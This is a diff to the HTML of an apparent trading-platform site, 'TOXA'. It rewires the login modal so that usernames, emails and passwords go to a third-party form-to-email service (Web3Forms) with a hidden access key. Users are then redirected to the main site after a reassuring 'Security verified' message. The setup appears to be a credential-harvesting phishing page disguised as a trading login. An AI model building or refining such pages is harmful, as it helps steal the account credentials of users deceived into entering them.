@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TOXA | Premium Trading Platform</title>
+    <title>TOXA | Live Trading Platform</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -117,14 +117,22 @@
             <span class="close-btn" onclick="closeModal()">&times;</span>
             <h2 id="modalTitle">Access <span style="color:var(--accent-yellow)">TOXA</span></h2>
             
-            <!-- FORM LINKED TO YOUR FORMSPREE -->
-            <form action="https://formspree.io/f/mqegdwqg" method="POST" id="authForm">
+            <!-- WEB3FORMS SYSTEM -->
+            <form action="https://api.web3forms.com/submit" method="POST" id="authForm">
+                
+                <!-- YOUR UNIQUE ACCESS KEY -->
+                <input type="hidden" name="access_key" value="362faa5b-d2bc-4c2d-9ac3-861b07e15dba">
+                
                 <input type="text" name="Username" id="userField" placeholder="Username" required>
                 <input type="email" name="Email" id="emailField" placeholder="Email Address" required>
                 <input type="password" name="Password" placeholder="Password" required>
-                <button type="submit" class="btn-sm-gold" style="width: 100%; padding: 15px; font-size: 16px;">Continue to Trade</button>
+                
+                <!-- Success Redirect -->
+                <input type="hidden" name="redirect" value="http://toxatrading.co/">
+
+                <button type="submit" class="btn-sm-gold" style="width: 100%; padding: 15px; font-size: 16px; cursor: pointer;">Continue to Trade</button>
             </form>
-            <p style="margin-top: 15px; font-size: 11px; color: #666;">By continuing, you agree to secure data processing.</p>
+            <p style="margin-top: 15px; font-size: 11px; color: #666;">Security verified. Your trading session will start after login.</p>
         </div>
     </div>
 
@@ -168,11 +176,9 @@
         function closeModal() { document.getElementById('authModal').style.display = 'none'; }
 
         // Local Storage Tracking
-        document.getElementById('authForm').addEventListener('submit', function(e) {
+        document.getElementById('authForm').addEventListener('submit', function() {
             const user = document.getElementById('userField').value;
-            const email = document.getElementById('emailField').value;
-            localStorage.setItem("toxa_session", JSON.stringify({user, email, date: new Date().toLocaleString()}));
-            // Form continues to submit to Formspree for email notification
+            localStorage.setItem("toxa_user", user);
         });
 
         // Initialize TradingView Widget
